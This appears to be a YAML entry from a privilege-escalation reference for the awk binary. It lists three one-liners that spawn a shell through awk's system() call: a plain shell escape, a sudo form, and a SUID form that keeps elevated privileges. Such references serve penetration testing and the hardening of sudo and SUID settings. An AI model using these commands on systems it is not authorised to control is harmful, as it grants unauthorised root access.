---
functions:
  exec-interactive:
    - code: awk 'BEGIN {system("/bin/sh")}'
  sudo-enabled:
    - code: sudo awk 'BEGIN {system("/bin/sh -p")}'
  suid-limited:
    - code: ./awk 'BEGIN {system("/bin/sh -p")}'
---